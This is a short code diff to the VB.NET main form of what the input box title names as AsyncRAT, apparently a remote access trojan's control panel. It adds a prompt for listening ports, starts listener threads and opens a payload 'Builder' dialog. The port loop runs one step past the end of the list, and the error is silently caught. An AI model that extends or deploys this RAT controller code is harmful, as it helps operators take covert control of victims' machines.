@@ -26,11 +26,26 @@ Public Class Form1
         Dim Req_Out As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.OutComing))
         Req_Out.Start()
 
-        For Each i In Settings.Ports.ToList
-            S = New Server
-            Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
-            listener.Start(i)
-        Next
+
+        Try
+            Dim URL As String = InputBox("Enter Ports", "AsyncRAT", "8989,5656,2323")
+            If String.IsNullOrEmpty(URL) Then
+                Environment.Exit(0)
+            Else
+                Dim A As String() = Split(URL, ",")
+                For i As Integer = 0 To A.Length
+                    If A(i) <> Nothing Then
+                        Settings.Ports.Add(A(i))
+                        S = New Server
+                        Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
+                        listener.Start(A(i))
+                    End If
+                Next
+            End If
+        Catch ex As Exception
+            Debug.WriteLine("URL " + ex.Message)
+        End Try
+
 
     End Sub
 
@@ -227,5 +242,9 @@ Public Class Form1
             End If
         Catch ex As Exception
         End Try
+    End Sub
+
+    Private Sub BUILDERToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BUILDERToolStripMenuItem.Click
+        Builder.ShowDialog()
     End Sub
 End Class
